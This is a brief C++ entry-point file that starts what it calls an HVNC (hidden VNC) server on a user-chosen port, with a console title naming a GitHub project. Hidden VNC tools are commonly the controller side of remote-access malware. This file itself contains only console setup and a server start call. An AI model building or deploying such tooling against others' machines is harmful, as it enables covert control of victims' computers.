#include "Common.h"
#include "ControlWindow.h"
#include "Server.h"
#include <iostream>
#include <stdlib.h>

int CALLBACK WinMain(HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR lpCmdLine,
   int nCmdShow)
{
   AllocConsole();

   freopen("CONIN$", "r", stdin);
   freopen("CONOUT$", "w", stdout);
   freopen("CONOUT$", "w", stderr);

   SetConsoleTitle(TEXT("HVNC - github.com/Meltedd/HVNC"));

   int port;
   std::cout << "[!] Server Port: ";
   std::cin >> port;

   std::system("CLS");
   printf("[-] Starting HVNC Server...\n");

   if(!StartServer(port))
   {
      wprintf(TEXT("[!] Server Couldn't Start (Error: %d)\n"), WSAGetLastError());
      getchar();
   }
   return 0;
}
